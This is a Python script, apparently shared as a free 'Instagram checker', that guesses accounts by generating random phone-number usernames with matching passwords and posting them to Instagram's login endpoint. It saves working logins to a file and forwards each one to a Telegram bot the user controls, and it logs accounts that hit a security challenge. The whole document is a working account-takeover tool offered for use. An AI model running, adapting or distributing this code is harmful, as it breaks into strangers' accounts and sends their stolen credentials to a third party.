

# coder : exec - warrior
# github : 6f8
# instagram : gxp6
# telegram : ysysd
# Dont Give Up

try:
    import requests,random,time,os
    from user_agent import *
except:
    os.system('pip install requests')    

W = "\033[0m";R = '\033[31;1m';B = "\033[1;90m"; C = "\033[1;97m";E = "\033[1;92m"


Banner = f"""
{E}     .########.##.....##.########..######.
{E}     .##........##...##..##.......##....##
{E}     .##.........##.##...##.......##......
{E}     .######......###....######...##......
{E}     .##.........##.##...##.......##......
{E}     .##........##...##..##.......##....##
{E}     .########.##.....##.########..######. 

{R}           THIS TOOL FREE IG CHECKER          
{R}             ↿ {C}MAME {R}⇂     {E}⇝   {C}EXEC
{R}            ↿ {C}GITHUB {R}⇂    {E}⇝   {C}6F8
{R}           ↿ {C}TELEGRAM {R}⇂   {E}⇝   {C}YSYSD
{R}           ↿ {C}INSTAGRAM {R}⇂  {E}⇝   {C}GXP6
\n"""
for warrior in Banner.splitlines():
    time.sleep(0.05)
    print(warrior)

ID = input (C+"("+E+"⌯"+C+") "+C+ "Enter Your ID Bot : "+E)
token = input (C+"("+E+"⌯"+C+") "+C+ "Enter Your Token Bot : "+E)

def login():
    ban, av, er, at = 0,0,0,0
    while True:
        time.sleep(2)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(7))
        username = '98912'+R
        password = R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            time.sleep(0.50)
            open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n 𝑷𝑯 ➪ : {username} \n - 𝑷𝑺 ➪ : {password} \n • 𝐅𝐫𝐎𝐦 : @YSYSD -Warrior- @VNVN6 ')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"Username : {username}\n Password : {password} \n\n")
        else:
            er += 1
            time.sleep(0.50)
            print(f"\r {E}Username ⇝  : {username} | Found:{av} | {E}Password ⇝  :{password} | Banned:{ban} | Error:{er}", end="")
            
login()
